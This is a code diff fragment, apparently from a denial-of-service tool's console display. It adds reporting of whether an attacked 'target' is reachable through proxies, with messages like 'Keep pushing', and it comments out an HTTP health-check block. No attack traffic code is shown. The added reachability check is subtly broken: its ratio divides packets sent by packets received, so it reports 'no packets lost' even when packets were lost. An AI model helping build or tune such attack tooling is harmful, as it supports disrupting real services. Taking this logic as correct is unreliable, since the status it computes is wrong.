+                status_string += f" from our IP (ping {r.avg_rtt:.0f} ms, {r.packet_loss * 100:.0f}% packet loss)."
         else:
             status_string += ansi_wrap(f" UNREACHABLE", color="red")
-            status_string += f" from our IP ({pr.packet_loss*100:.0f}% packet loss)."
+            status_string += f" from our IP ({r.packet_loss * 100:.0f}% packet loss)."
+            status_string += ansi_wrap(f" It may be down. We are shooting blanks right now.", color="red")
+    elif last_l4_proxied_results and len(last_l4_proxied_results) > 0:
+        # collect stats about the results
+        results = last_l4_proxied_results.copy()
+        successful_pings = [r for r in results if r.is_alive]
+        n_successful_pings = len(successful_pings)
+        n_total_pings = len(results)
+        # craft average ping result for all proxies
+        all_rtts = []
+        for r in results:
+            all_rtts.extend(r.rtts)
+        r = Host(
+            address=results[0].address,
+            packets_sent=sum([r.packets_sent for r in results]),
+            rtts=all_rtts
+        )
+
+        if r.is_alive:
+            successful_pings_ratio = float(r.packets_sent) / r.packets_received
+            if successful_pings_ratio > 0.5:
+                status_string += ansi_wrap(f" REACHABLE", color="green")
+                status_string += f" through proxies (best ping {r.avg_rtt:.0f} ms, no packets lost)."
+            else:
+                status_string += ansi_wrap(f" PARTIALLY REACHABLE", color="yellow")
+                status_string += f" through proxies (best ping {r.avg_rtt:.0f} ms, {r.packet_loss * 100:.0f}% packet loss)."
+                status_string += " Keep pushing."
+        else:
+            status_string += ansi_wrap(f" UNREACHABLE", color="red")
+            status_string += f" through proxies ({r.packet_loss * 100:.0f}% packet loss)."
             status_string += ansi_wrap(f" It may be down. We are shooting blanks right now.", color="red")
     else:
         status_string += f"Checking if the target is reachable{periods}"
     status_string += "\n"
 
-    # craft health check line
-    status_string += "       "
-    if not last_ping_result:
-        status_string += ""
-    elif not last_ping_result.is_alive:
-        status_string += "Health status cannot be checked."
-    elif last_get_response:
-        status_string += "Target"
-        lr = last_get_response
-        if lr.status_code <= 500:
-            status_string += ansi_wrap(f" is operating normally", color="green")
-            status_string += f" (last HTTP response code = {lr.status_code}"
-            if lr.reason:
-                status_string += f", reason: {lr.reason}"
-            status_string += ")."
-        else:
-            status_string += ansi_wrap(f" may be down", color="red")
-            status_string += f" (last HTTP response code = {lr.status_code}"
-            if lr.reason:
-                status_string += f", reason: {lr.reason}"
-            status_string += ")."
-
-
-    else:
-        status_string += f"Checking target health{periods}"
+    # # craft health check line
+    # status_string += "       "
+    # if not last_ping_result:
+    #     status_string += ""
+    # elif not last_ping_result.is_alive:
+    #     status_string += "Health status cannot be checked."
+    # elif last_get_response:
+    #     status_string += "Target"
+    #     lr = last_get_response
+    #     if lr.status_code <= 500:
+    #         status_string += ansi_wrap(f" is operating normally", color="green")
+    #         status_string += f" (last HTTP response code = {lr.status_code}"
+    #         if lr.reason:
+    #             status_string += f", reason: {lr.reason}"
+    #         status_string += ")."
+    #     else:
+    #         status_string += ansi_wrap(f" may be down", color="red")
+    #         status_string += f" (last HTTP response code = {lr.status_code}"
+    #         if lr.reason:
+    #             status_string += f", reason: {lr.reason}"
+    #         status_string += ")."
+    # else:
+    #     status_string += f"Checking target health{periods}"
 
     return status_string
 
